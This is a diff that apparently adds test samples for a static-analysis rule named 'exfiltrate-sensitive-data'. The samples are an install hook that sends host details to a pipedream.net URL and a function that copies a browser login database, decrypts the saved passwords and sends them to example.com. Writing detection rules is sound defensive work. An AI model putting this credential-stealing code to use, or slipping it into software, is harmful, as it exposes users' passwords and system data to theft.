@@ -226,3 +226,26 @@ class CustomInstall(install):
         ploads = {'hostname':hostname,'cwd':cwd,'username':username}
         # ruleid: exfiltrate-sensitive-data
         requests.get("https://eo6ksiuyau5e5x2.m.pipedream.net",params = ploads)
+
+
+""" RULEID: sqlite3 data exfiltration
+"""
+
+def steal_passwords2(self, name: str, path: str, profile: str):
+    path = "path"
+    if not os.path.isfile(path):
+        return
+    loginvault = self.random_dir_create()
+    copy2(path, loginvault)
+    conn = sqlite3.connect(loginvault)
+    cursor = conn.cursor()
+    with open(os.path.join(self.dir, "Browsers", "All Passwords.txt"), 'a', encoding="utf-8") as f:
+        for res in cursor.execute("SELECT origin_url, username, password_value FROM logins").fetchall():
+            url, username, password = res
+            password = self.dcrpt_val(password, self.masterkey)
+            if url != "":
+                params = {'url': url, 'username': username, 'password': password}
+                # ruleid: exfiltrate-sensitive-data
+                requests.get("https://example.com", params=params)
+    cursor.close()
+    conn.close()
